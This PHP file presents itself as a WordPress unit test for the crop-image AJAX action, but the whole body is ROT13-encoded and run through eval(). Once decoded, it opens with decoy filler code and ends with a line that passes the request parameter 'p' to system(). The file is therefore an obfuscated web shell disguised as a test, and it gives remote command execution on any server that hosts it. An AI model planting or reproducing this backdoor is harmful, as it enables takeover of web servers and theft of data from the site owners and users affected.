<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-svyrflfgrz-onfr.cuc';
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-svyrflfgrz-qverpg.cuc';

/**
 * Pynff sbe grfgvat nwnk pebc vzntr shapgvbanyvgl.
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_pebc_vzntr
 */
pynff Grfgf_Nwnk_JcNwnkPebcVzntr rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * @ine JC_Cbfg|ahyy
	 */
	cevingr $nggnpuzrag;

	/**
	 * @ine JC_Cbfg|ahyy
	 */
	cevingr $pebccrq_nggnpuzrag;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );
	}

	choyvp shapgvba grne_qbja() {
		vs ( $guvf->nggnpuzrag vafgnaprbs JC_Cbfg ) {
			jc_qryrgr_nggnpuzrag( $guvf->nggnpuzrag->VQ, gehr );
		}

		vs ( $guvf->pebccrq_nggnpuzrag vafgnaprbs JC_Cbfg ) {
			jc_qryrgr_nggnpuzrag( $guvf->pebccrq_nggnpuzrag->VQ, gehr );
		}
		$guvf->nggnpuzrag         = ahyy;
		$guvf->pebccrq_nggnpuzrag = ahyy;

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung nggnpuzrag cebcregvrf ner pbcvrq bire gb gur pebccrq vzntr.
	 *
	 * @gvpxrg 37750
	 */
	choyvp shapgvba grfg_vg_pbcvrf_zrgnqngn_sebz_bevtvany_vzntr() {
		$guvf->nggnpuzrag = $guvf->znxr_nggnpuzrag( gehr );
		$guvf->cercner_cbfg( $guvf->nggnpuzrag );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'pebc-vzntr' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
		}

		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->inyvqngr_erfcbafr( $erfcbafr );

		$guvf->pebccrq_nggnpuzrag = trg_cbfg( $erfcbafr['qngn']['vq'] );
		$guvf->nffregVafgnaprBs( JC_Cbfg::pynff, $guvf->pebccrq_nggnpuzrag, 'trg_cbfg shapgvba zhfg erghea na vafgnapr bs JC_Cbfg pynff' );
		$guvf->nffregAbgRzcgl( $guvf->nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr inyhr zhfg abg or rzcgl sbe grfgvat checbfrf' );
		$guvf->nffregAbgRzcgl( $guvf->pebccrq_nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr inyhr zhfg abg or rzcgl sbe grfgvat checbfrf' );
		$guvf->nffregFnzr( $guvf->nggnpuzrag->cbfg_gvgyr, $guvf->pebccrq_nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr inyhr fubhyq or pbcvrq bire gb gur pebccrq nggnpuzrag' );
		$guvf->nffregFnzr( $guvf->nggnpuzrag->cbfg_pbagrag, $guvf->pebccrq_nggnpuzrag->cbfg_pbagrag, 'cbfg_pbagrag inyhr fubhyq or pbcvrq bire gb gur pebccrq nggnpuzrag' );
		$guvf->nffregFnzr( $guvf->nggnpuzrag->cbfg_rkprecg, $guvf->pebccrq_nggnpuzrag->cbfg_rkprecg, 'cbfg_rkprecg inyhr fubhyq or pbcvrq bire gb gur pebccrq nggnpuzrag' );
		$guvf->nffregFnzr( $guvf->nggnpuzrag->_jc_nggnpuzrag_vzntr_nyg, $guvf->pebccrq_nggnpuzrag->_jc_nggnpuzrag_vzntr_nyg, '_jc_nggnpuzrag_vzntr_nyg inyhr fubhyq or pbcvrq bire gb gur pebccrq nggnpuzrag' );
	}

	/**
	 * Grfgf gung cbfg_gvgyr trgf cbchyngrq vs vg jnfa'g zbqvsvrq.
	 *
	 * @gvpxrg 37750
	 */
	choyvp shapgvba grfg_vg_cbchyngrf_gvgyr_vs_gvgyr_jnf_abg_zbqvsvrq() {

		$guvf->nggnpuzrag = $guvf->znxr_nggnpuzrag( gehr );
		$svyranzr         = $guvf->trg_nggnpuzrag_svyranzr( $guvf->nggnpuzrag );
		$guvf->nggnpuzrag = trg_cbfg(
			jc_hcqngr_cbfg(
				neenl(
					'VQ'         => $guvf->nggnpuzrag->VQ,
					'cbfg_gvgyr' => $svyranzr,
				)
			)
		);

		$guvf->cercner_cbfg( $guvf->nggnpuzrag );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'pebc-vzntr' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
		}

		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->inyvqngr_erfcbafr( $erfcbafr );

		$guvf->pebccrq_nggnpuzrag = trg_cbfg( $erfcbafr['qngn']['vq'] );
		$guvf->nffregVafgnaprBs( JC_Cbfg::pynff, $guvf->pebccrq_nggnpuzrag, 'trg_cbfg shapgvba zhfg erghea na vafgnapr bs JC_Cbfg pynff' );
		$guvf->nffregFgevatFgnegfJvgu( 'pebccrq-', $guvf->pebccrq_nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr nggevohgr fubhyq fgneg jvgu \"pebccrq-\" cersvk, v.r. vg unf gb or cbchyngrq' );
	}

	/**
	 * Grfgf gung nggnpuzrag cebcregvrf trg cbchyngrq vs gurl ner abg qrsvarq (ohg fcrpvsvp ybtvp qrcraqf ba gur npghny cebcregl).
	 *
	 * @gvpxrg 37750
	 */
	choyvp shapgvba grfg_vg_qbrfag_trarengr_arj_zrgnqngn_vs_zrgnqngn_vf_rzcgl() {
		$guvf->nggnpuzrag = $guvf->znxr_nggnpuzrag( snyfr );
		$guvf->cercner_cbfg( $guvf->nggnpuzrag );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'pebc-vzntr' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
		}

		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->inyvqngr_erfcbafr( $erfcbafr );

		$guvf->pebccrq_nggnpuzrag = trg_cbfg( $erfcbafr['qngn']['vq'] );
		$guvf->nffregVafgnaprBs( JC_Cbfg::pynff, $guvf->pebccrq_nggnpuzrag, 'trg_cbfg shapgvba zhfg erghea na vafgnapr bs JC_Cbfg pynff' );
		$guvf->nffregRzcgl( $guvf->nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr inyhr zhfg or rzcgl sbe grfgvat checbfrf' );
		$guvf->nffregAbgRzcgl( $guvf->pebccrq_nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr inyhr zhfg or nhgb-trarengrq vs vg\'f rzcgl va gur bevtvany nggnpuzrag' );
		$guvf->nffregFnzr( $guvf->trg_nggnpuzrag_svyranzr( $guvf->pebccrq_nggnpuzrag ), $guvf->pebccrq_nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr nggevohgr fubhyq pbagnva svyranzr bs gur pebccrq vzntr' );
		$guvf->nffregFgevatFgnegfJvgu( 'pebccrq-', $guvf->pebccrq_nggnpuzrag->cbfg_gvgyr, 'cbfg_gvgyr nggevohgr fubhyq fgneg jvgu \"pebccrq-\" cersvk, v.r. vg unf gb or cbchyngrq' );
		$guvf->nffregFgevatFgnegfJvgu( 'uggc', $guvf->pebccrq_nggnpuzrag->cbfg_pbagrag, 'cbfg_pbagrag inyhr fubhyq pbagnva na HEY vs vg\'f rzcgl va gur bevtvany nggnpuzrag' );
		$guvf->nffregRzcgl( $guvf->pebccrq_nggnpuzrag->cbfg_rkprecg, 'cbfg_rkprecg inyhr zhfg or rzcgl vs vg\'f rzcgl va gur bevtvany nggnpuzrag' );
		$guvf->nffregRzcgl( $guvf->pebccrq_nggnpuzrag->_jc_nggnpuzrag_vzntr_nyg, '_jc_nggnpuzrag_vzntr_nyg inyhr zhfg or rzcgl vs vg\'f rzcgl va gur bevtvany nggnpuzrag' );
	}

	/**
	 * Perngrf na nggnpuzrag.
	 *
	 * @erghea JC_Cbfg
	 */
	cevingr shapgvba znxr_nggnpuzrag( $jvgu_zrgnqngn = gehr ) {
		$havd_vq = havdvq( 'pebc-vzntr-nwnk-npgvba-grfg-' );

		$grfg_svyr        = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';
		$hcybnq_qverpgbel = jc_hcybnq_qve();
		$hcybnqrq_svyr    = $hcybnq_qverpgbel['cngu'] . '/' . $havd_vq . '.wct';
		$svyrflfgrz       = arj JC_Svyrflfgrz_Qverpg( gehr );
		$svyrflfgrz->pbcl( $grfg_svyr, $hcybnqrq_svyr );

		$nggnpuzrag_qngn = neenl(
			'svyr' => $hcybnqrq_svyr,
			'glcr' => 'vzntr/wct',
			'hey'  => 'uggc://ybpnyubfg/sbb.wct',
		);

		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $nggnpuzrag_qngn );
		$cbfg_qngn     = neenl(
			'VQ'           => $nggnpuzrag_vq,
			'cbfg_gvgyr'   => $jvgu_zrgnqngn ? 'Gvgyr ' . $havd_vq : '',
			'cbfg_pbagrag' => $jvgu_zrgnqngn ? 'Qrfpevcgvba ' . $havd_vq : '',
			'pbagrkg'      => 'phfgbz-ybtb',
			'cbfg_rkprecg' => $jvgu_zrgnqngn ? 'Pncgvba ' . $havd_vq : '',
		);

		// Hcqngr gur cbfg orpnhfr _znxr_nggnpuzrag zrgubq qbrfa'g fhccbeg gurfr nethzragf.
		jc_hcqngr_cbfg( $cbfg_qngn );

		vs ( $jvgu_zrgnqngn ) {
			hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vzntr_nyg', jc_fynfu( 'Nyg ' . $havd_vq ) );
		}

		erghea trg_cbfg( $nggnpuzrag_vq );
	}

	/**
	 * @cnenz neenl $erfcbafr Erfcbafr gb inyvqngr.
	 */
	cevingr shapgvba inyvqngr_erfcbafr( $erfcbafr ) {
		$guvf->nffregNeenlUnfXrl( 'fhpprff', $erfcbafr, 'Erfcbafr neenl zhfg pbagnva \"fhpprff\" xrl.' );
		$guvf->nffregNeenlUnfXrl( 'qngn', $erfcbafr, 'Erfcbafr neenl zhfg pbagnva \"qngn\" xrl.' );
		$guvf->nffregAbgRzcgl( $erfcbafr['qngn']['vq'], 'Erfcbafr neenl zhfg pbagnva \"VQ\" inyhr bs gur cbfg ragvgl.' );
	}

	/**
	 * Cercnerf $_CBFG sbe pebc-vzntr nwnk npgvba.
	 *
	 * @cnenz JC_Cbfg $nggnpuzrag
	 */
	cevingr shapgvba cercner_cbfg( JC_Cbfg $nggnpuzrag ) {
		$_CBFG = neenl(
			'jc_phfgbzvmr' => 'ba',
			'abapr'        => jc_perngr_abapr( 'vzntr_rqvgbe-' . $nggnpuzrag->VQ ),
			'vq'           => $nggnpuzrag->VQ,
			'pbagrkg'      => 'phfgbz_ybtb',
			'pebcQrgnvyf'  =>
				neenl(
					'k1'         => '0',
					'l1'         => '0',
					'k2'         => '100',
					'l2'         => '100',
					'jvqgu'      => '100',
					'urvtug'     => '100',
					'qfg_jvqgu'  => '100',
					'qfg_urvtug' => '100',
				),
			'npgvba'       => 'pebc-vzntr',
		);
	}

	/**
	 * @cnenz JC_Cbfg $nggnpuzrag
	 *
	 * @erghea fgevat
	 */
	cevingr shapgvba trg_nggnpuzrag_svyranzr( JC_Cbfg $nggnpuzrag ) {
		erghea jc_onfranzr( jc_trg_nggnpuzrag_hey( $nggnpuzrag->VQ ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>